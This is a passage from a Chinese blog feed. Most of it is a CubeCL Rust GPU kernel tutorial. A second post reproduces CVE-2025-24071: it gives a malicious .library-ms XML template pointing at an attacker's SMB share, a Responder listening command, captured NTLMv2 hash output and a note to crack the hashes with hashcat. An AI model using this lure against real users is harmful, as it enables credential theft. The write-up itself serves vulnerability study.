class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p><strong>循环展开（Loop Unrolling）</strong> 是一种通过减少循环控制开销（如分支判断、计数器更新）来提升性能的优化技术。它通过将循环体内的代码重复多次，减少循环迭代次数，从而提高指令级并行性（ILP）和内存访问效率。以下是 CUDA 循环展开的详细解释和实现方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch_unchecked)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">sum_basic</span>&lt;F: Float&gt;(input: &amp;Array&lt;F&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;F&gt;, <span class="meta">#[comptime]</span> end: <span class="type">Option</span>&lt;<span class="type">u32</span>&gt;) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">unroll</span> = end.<span class="title function_ invoke__">is_some</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">end</span> = end.<span class="title function_ invoke__">unwrap_or_else</span>(|| input.<span class="title function_ invoke__">len</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">sum</span> = F::<span class="title function_ invoke__">new</span>(<span class="number">0.0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[unroll(unroll)]</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..end &#123;</span><br><span class="line">        sum += input[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    output[UNIT_POS] = sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高级话题：矩阵运算"><a href="#高级话题：矩阵运算" class="headerlink" title="高级话题：矩阵运算"></a>高级话题：矩阵运算</h2><p>处理矩阵需要同时考虑X和Y维度：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> ABSOLUTE_POS_Y &lt; output.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">            output[ABSOLUTE_POS_X+ABSOLUTE_POS_Y *【x每行unit的个数】] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X+ABSOLUTE_POS_Y *【x每行unit的个数】]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点：</p><ol><li>使用<code>ABSOLUTE_POS_X</code>和<code>ABSOLUTE_POS_Y</code>访问二维索引</li><li>手动计算线性索引</li><li>确保边界检查</li></ol><p>当然，仅仅是处理一个参数在世界情况中还是并不常见，那么多个参数的情况也很简单，只需要在队伍的lauch中添加参数即可</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input1: &amp;Array&lt;Line&lt;F&gt;&gt;,input2:&amp;Array&lt;Line&lt;F&gt;&gt;,output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input1.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> ABSOLUTE_POS_Y &lt; output.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">            output[ABSOLUTE_POS_X+ABSOLUTE_POS_Y*<span class="number">2</span>] = <span class="title function_ invoke__">add</span>(input1[ABSOLUTE_POS_X+ABSOLUTE_POS_Y*<span class="number">2</span>],input2[ABSOLUTE_POS_X+ABSOLUTE_POS_Y*<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">            &amp;client,</span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">2u32</span>, <span class="number">2u32</span>, <span class="number">1u32</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;output_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h2 id="实现一个加速反色"><a href="#实现一个加速反色" class="headerlink" title="实现一个加速反色"></a>实现一个加速反色</h2><p>cpu处理</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> image::&#123;ImageBuffer, Rgb, RgbImage&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 1. 读取图像</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">img</span> = image::<span class="title function_ invoke__">open</span>(<span class="string">&quot;./../image.jpg&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="comment">// 2. 转换为 RGB 格式（确保处理颜色通道）</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rgb_img</span> = img.<span class="title function_ invoke__">to_rgb8</span>();</span><br><span class="line">    <span class="comment">// 3. 创建可变的 ImageBuffer</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span>: RgbImage = ImageBuffer::<span class="title function_ invoke__">new</span>(rgb_img.<span class="title function_ invoke__">width</span>(), rgb_img.<span class="title function_ invoke__">height</span>());</span><br><span class="line">    <span class="comment">// 4. 遍历像素并反转颜色</span></span><br><span class="line">    <span class="keyword">for</span> (x, y, pixel) <span class="keyword">in</span> rgb_img.<span class="title function_ invoke__">enumerate_pixels</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">inverted</span> = <span class="title function_ invoke__">Rgb</span>([</span><br><span class="line">            <span class="number">255</span> - pixel[<span class="number">0</span>],  <span class="comment">// 反转红色通道</span></span><br><span class="line">            <span class="number">255</span> - pixel[<span class="number">1</span>],  <span class="comment">// 反转绿色通道</span></span><br><span class="line">            <span class="number">255</span> - pixel[<span class="number">2</span>],  <span class="comment">// 反转蓝色通道</span></span><br><span class="line">        ]);</span><br><span class="line">        buffer.<span class="title function_ invoke__">put_pixel</span>(x, y, inverted);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5. 保存处理后的图像</span></span><br><span class="line">    buffer.<span class="title function_ invoke__">save</span>(<span class="string">&quot;./../output.jpg&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gpu处理，这里可以看到cubecl使用的并不只有泛型，还可以使用u32等类型去运算，但必需保证运算的类型是可以被支持的，否则会出现以下错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U8 is not a valid WgpuElement</span><br></pre></td></tr></table></figure><p>实现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> core;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> core::<span class="type">u32</span>;</span><br><span class="line"><span class="keyword">use</span> cubecl::prelude::Float;</span><br><span class="line"><span class="keyword">use</span> std::ops::Sub;</span><br><span class="line"><span class="keyword">use</span> cubecl::prelude::*;</span><br><span class="line"><span class="keyword">use</span> cubecl::wgpu::WgpuDevice;</span><br><span class="line"><span class="keyword">use</span> image::&#123;ImageBuffer, Rgb&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>(input1: &amp;Array&lt;Line&lt;<span class="type">u32</span>&gt;&gt;,output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;<span class="type">u32</span>&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS &lt; input1.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">            output[ABSOLUTE_POS] = <span class="title function_ invoke__">gelu_scalar</span>(input1[ABSOLUTE_POS])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span>  <span class="comment">// 标记为GPU函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_scalar</span>(x: Line&lt;<span class="type">u32</span>&gt;) <span class="punctuation">-&gt;</span> Line&lt;<span class="type">u32</span>&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">minus</span>(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">minus</span>(a:Line&lt;<span class="type">u32</span>&gt;) <span class="punctuation">-&gt;</span> Line&lt;<span class="type">u32</span>&gt; &#123;</span><br><span class="line">    Line::<span class="title function_ invoke__">new</span>(<span class="type">u32</span>::<span class="title function_ invoke__">max_value</span>())-a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">launch</span>&lt;R: Runtime&gt;(device: &amp;R::Device,list:&amp;[<span class="type">u8</span>],w:<span class="type">u32</span>,h:<span class="type">u32</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span> = R::<span class="title function_ invoke__">client</span>(device);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">vectorization</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output_handle</span> = client.<span class="title function_ invoke__">empty</span>(list.<span class="title function_ invoke__">len</span>() * core::mem::size_of::&lt;<span class="type">u8</span>&gt;());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input_handle</span> = client.<span class="title function_ invoke__">create</span>(list);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        gelu_array::launch::&lt;R&gt;(</span><br><span class="line">            &amp;client,</span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">8000</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">100u32</span>, <span class="number">10u32</span>, <span class="number">1u32</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">u32</span>&gt;(&amp;input_handle, list.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">u32</span>&gt;(&amp;output_handle, list.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">        )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bytes</span> = client.<span class="title function_ invoke__">read_one</span>(output_handle.<span class="title function_ invoke__">binding</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bytes2</span> = client.<span class="title function_ invoke__">read_one</span>(input_handle.<span class="title function_ invoke__">binding</span>());</span><br><span class="line">    <span class="comment">// 把RGB Vec&lt;u8&gt;转化为图片</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span>: ImageBuffer&lt;Rgb&lt;<span class="type">u8</span>&gt;, <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt;&gt; = ImageBuffer::<span class="title function_ invoke__">from_raw</span>(w,h,bytes).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    b.<span class="title function_ invoke__">save</span>(<span class="string">&quot;./../output.png&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Runtime</span> = cubecl::wgpu::WgpuRuntime;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">default</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">img</span> = image::<span class="title function_ invoke__">open</span>(<span class="string">&quot;./../image.jpg&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="comment">// 转换为 RGB Vec&lt;u8&gt;格式（确保处理颜色通道）</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rgb_img</span> = img.<span class="title function_ invoke__">to_rgb8</span>();</span><br><span class="line">    <span class="keyword">let</span> (w,h) = rgb_img.<span class="title function_ invoke__">dimensions</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buf</span> = rgb_img.<span class="title function_ invoke__">into_raw</span>();</span><br><span class="line">    launch::&lt;Runtime&gt;(&amp;device,&amp;buf,w,h);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> gpu运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-24071-windows资源管理器欺骗漏洞</title>
      <link href="/2025/03/24/CVE-2025-24071-windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/03/24/CVE-2025-24071-windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><ul><li>Windows 10 Version 1809 for x64-based Systems</li><li>Windows 10 Version 1809 for 32-bit Systems</li><li>Windows Server 2025 (Server Core installation)</li><li>Windows Server 2025</li><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows 10 Version 1607 for x64-based Systems</li><li>Windows 10 Version 1607 for 32-bit Systems</li><li>Windows 10 for x64-based Systems</li><li>Windows 10 for 32-bit Systems</li><li>Windows 11 Version 24H2 for x64-based Systems</li><li>Windows 11 Version 24H2 for ARM64-based Systems</li><li>Windows Server 2022, 23H2 Edition (Server Core installation)</li><li>Windows 11 Version 23H2 for x64-based Systems</li><li>Windows 11 Version 23H2 for ARM64-based Systems</li><li>Windows 10 Version 22H2 for 32-bit Systems</li><li>Windows 10 Version 22H2 for ARM64-based Systems</li><li>Windows 10 Version 22H2 for x64-based Systems</li><li>Windows 11 Version 22H2 for x64-based Systems</li><li>Windows 11 Version 22H2 for ARM64-based Systems</li><li>Windows 10 Version 21H2 for x64-based Systems</li><li>Windows 10 Version 21H2 for ARM64-based Systems</li><li>Windows 10 Version 21H2 for 32-bit Systems</li><li>Windows Server 2022 (Server Core installation)</li><li>Windows Server 2022</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server 2019</li></ul></blockquote><h2 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KB5053606</span><br></pre></td></tr></table></figure><h2 id="利用概述"><a href="#利用概述" class="headerlink" title="利用概述"></a>利用概述</h2><p>通过构造一个恶意的SMB路径的.library-ms文件并诱导受害者解压，在解压过程中，windows文件管理器将自动解析library-ms文件的内容以进行阅览和检索，此时将检索其中的SMB路径，从而触发与目的路径的NTML的认证握手，导致NTLMv2的哈希被泄露，进而被攻击者用于进一步攻击。</p><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>SMB（Server Message Block） 是一种用于在计算机网络中实现<strong>文件共享、打印机共享和通信</strong>的网络协议</p><h5 id="Windows-的标准格式是UNC-路径"><a href="#Windows-的标准格式是UNC-路径" class="headerlink" title="Windows 的标准格式是UNC 路径"></a>Windows 的标准格式是UNC 路径</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;服务器名或IP地址&gt;\&lt;共享名&gt;\&lt;目录或文件&gt;</span><br></pre></td></tr></table></figure><p>在windows的SMB读取过程中，会发送NTLM认证握手</p><h3 id="library-ms"><a href="#library-ms" class="headerlink" title=".library-ms"></a>.library-ms</h3><p><code>.library-ms</code> 是 Windows 系统中用于管理 <strong>“库”（Libraries）</strong> 的特殊配置文件。它从 Windows 7 开始引入，用于整合和快速访问用户分散在不同位置的文件（如文档、图片、音乐等）。本质是一个 <strong>XML 文件</strong>，可以通过文本编辑器（如记事本）查看和编辑。以下是一个文档的示例内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">libraryDescription</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/2009/08/StorageService/Library&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>文档<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">isLibraryPinned</span>&gt;</span>true<span class="tag">&lt;/<span class="name">isLibraryPinned</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iconReference</span>&gt;</span>imageres.dll,-1002<span class="tag">&lt;/<span class="name">iconReference</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">templateInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">folderType</span>&gt;</span>&#123;7d49d726-3c21-4f05-99aa-fdc2c9474656&#125;<span class="tag">&lt;/<span class="name">folderType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">templateInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">isDefaultSaveLocation</span>&gt;</span>true<span class="tag">&lt;/<span class="name">isDefaultSaveLocation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>shell:::&#123;A8CDFF1C-4878-43BE-B5FD-F8091C1C60D0&#125;<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">libraryDescription</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;name&gt;</code>：库的显示名称（如“文档”）。</li><li><code>&lt;iconReference&gt;</code>：库的图标来源（如系统 DLL 文件中的图标索引）。</li><li><code>&lt;url&gt;</code>：关联的文件夹路径（这里是利用的关键点）。</li><li><code>&lt;isDefaultSaveLocation&gt;</code>：是否为默认保存位置。</li></ul><h3 id="尝试复现"><a href="#尝试复现" class="headerlink" title="尝试复现"></a>尝试复现</h3><p>首先我们需要有一个library-ms的模板，其中url放入的则是目标ip的地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">libraryDescription</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>\\ip_address\shared<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">libraryDescription</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并为其命名，这里的命名是随意的，譬如hacked.library-ms，此时我们将攻击机的ip地址写入后再进行压缩。</p><p>紧接着，我们在kali中对其进行监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -v</span><br></pre></td></tr></table></figure><p>然后对压缩包进行解压，此时我们在攻击机中可以看到已经有了反应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SMB] NTLMv2-SSP Client   : 192.168.80.134</span><br><span class="line">[SMB] NTLMv2-SSP Username : DESKTOP-D4RBES3\yu3</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : yu3::DESKTOP-D4RBES3:128ca242d7dd87d0:626246E5FBB74C638625A07E8400ADFE:01010000000000000007A5D7EE9BDB014E75D8DC02811CEE0000000002000800590042004D004B0001001E00570049004E002D0055004F004F0044004E004E00580057004F004100470004003400570049004E002D0055004F004F0044004E004E00580057004F00410047002E00590042004D004B002E004C004F00430041004C0003001400590042004D004B002E004C004F00430041004C0005001400590042004D004B002E004C004F00430041004C00070008000007A5D7EE9BDB01060004000200000008003xxxxxxxxxxxxxxxxxxx0020000001DA428B46F65565222FC18C404D73517EDBC06783D5A5A4D0900D3599E667450A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00380030002E00310032003800000000000000000000000000                            </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.80.134</span><br><span class="line">[SMB] NTLMv2-SSP Username : DESKTOP-D4RBES3\yu3</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : yu3::DESKTOP-D4RBES3:f8740cfcfde85a8b:63A96B39B46CFBF239190987CE57680C:01010000000000000007A5D7EE9BDB0138AE6847214CF01200000000xxxxxxxxxx004D004B0001001E00570049004E002D0055004F004F0044004E004E00580057004F004100470004003400570049004E002D0055004F004F0044004E004E00580057004F00410047002E00590042004D004B002E004C004F00430041004C0003001400590042004D004B002E004C004F00430041004C0005001400590042004D004B002E004C004F00430041004C00070008000007A5D7EE9BDB010600040002000000080030003000000000000000010000000020000001DA428B46F65565222FC18C404D73517EDBC06783D5A5A4D0900D3599E667450A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00380030002E00310032003800000000000000000000000000                          </span><br></pre></td></tr></table></figure><p>之后就可以将其放入hashcat进行爆破密码</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rust-web编译题型</title>
      <link href="/2025/03/13/rust-web%E7%BC%96%E8%AF%91%E9%A2%98%E5%9E%8B/"/>
      <url>/2025/03/13/rust-web%E7%BC%96%E8%AF%91%E9%A2%98%E5%9E%8B/</url>
      
